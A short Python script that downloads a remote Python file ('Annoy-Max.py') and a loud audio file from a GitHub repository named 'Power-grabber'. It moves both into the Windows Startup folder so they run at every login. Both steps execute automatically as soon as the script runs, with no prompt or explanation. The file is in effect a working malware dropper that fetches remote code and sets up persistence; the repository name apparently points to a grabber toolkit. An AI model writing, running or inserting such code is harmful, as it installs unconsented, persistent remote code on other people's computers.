import requests
import os
import shutil
def download_another_file():
    url = "https://raw.githubusercontent.com/Powercascade/Power-grabber/refs/heads/main/Options/Annoy-Max.py"
    response = requests.get(url)
    downloads_path = os.path.join(os.path.expanduser("~"), "Downloads")
    file_path = os.path.join(downloads_path, "Annoy-Max.py")
    startup_path = os.path.join(os.path.expanduser("~"), "AppData", "Roaming", "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
    startup_file = os.path.join(startup_path, "Annoy-Max.py")
    if response.status_code == 200:
        with open(file_path, "wb") as file:
            file.write(response.content)
        shutil.move(file_path, startup_file)
    else:
        print("Failed to download file")
download_another_file()
def download_audio():
    url = "https://raw.githubusercontent.com/Powercascade/Power-grabber/main/Loud"
    response = requests.get(url)
    downloads_path = os.path.join(os.path.expanduser("~"), "Downloads")
    file_path = os.path.join(downloads_path, "loud.mp3")
    startup_path = os.path.join(os.path.expanduser("~"), "AppData", "Roaming", "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
    startup_file = os.path.join(startup_path, "loud.mp3")
    if response.status_code == 200:
        with open(file_path, "wb") as file:
            file.write(response.content)
        shutil.move(file_path, startup_file)
    else:
        print("Failed to download audio file")
download_audio()